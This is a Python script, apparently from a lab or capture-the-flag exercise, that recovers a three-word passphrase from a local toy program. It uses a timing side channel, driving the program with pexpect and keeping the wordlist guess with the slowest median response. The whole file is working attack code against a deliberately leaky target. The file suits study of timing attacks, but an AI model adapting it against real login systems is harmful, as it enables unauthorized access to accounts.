#!/usr/bin/python3
#
# Timing side-channel attack on sidechannel.py.
#
# check() returns on the first wrong character and sleeps once per correct
# character, and the target reports its own elapsed time, so the running time
# grows with the length of the matching prefix. We recover the passphrase one
# word at a time: for each candidate we take the median reported time over
# several runs (to smooth jitter) and keep the slowest, then fix it and move on.
#
# This uses pexpect to drive the target like a shell program.

import pexpect


def load(path):
    return [w for w in open(path).read().splitlines() if w]


articles = load("dict/articles")
adjectives = load("dict/adjectives")
nouns = load("dict/nouns")

proc = pexpect.spawn("python3 ./sidechannel.py", encoding="utf-8", timeout=30)


def once(guess):
    proc.expect_exact(">> Password: ")
    proc.sendline(guess)
    proc.readline()                       # terminal echo of our input
    line = proc.readline()                # "Elapsed time [N] usec"
    return int(line.split("[")[1].split("]")[0])


def measure(guess, runs=7):
    xs = sorted(once(guess) for _ in range(runs))
    return xs[len(xs) // 2]               # median


def best(prefix, candidates):
    return max(candidates, key=lambda c: measure((prefix + " " + c).strip()))


article = articles[0] if len(articles) == 1 else best("", articles)
adjective = best(article, adjectives)
noun = best(article + " " + adjective, nouns)

solution = f"{article} {adjective} {noun}"
print("Solution is:")
print(solution)

# Confirm against the same instance we attacked: a fresh run would pick a new
# random passphrase, so verification has to use this process.
import sys

proc.expect_exact(">> Password: ")
proc.sendline(solution)
if proc.expect(["Access granted!", pexpect.TIMEOUT, pexpect.EOF], timeout=10) == 0:
    print("Access granted!")
    sys.exit(0)
print("solution rejected", file=sys.stderr)
sys.exit(1)
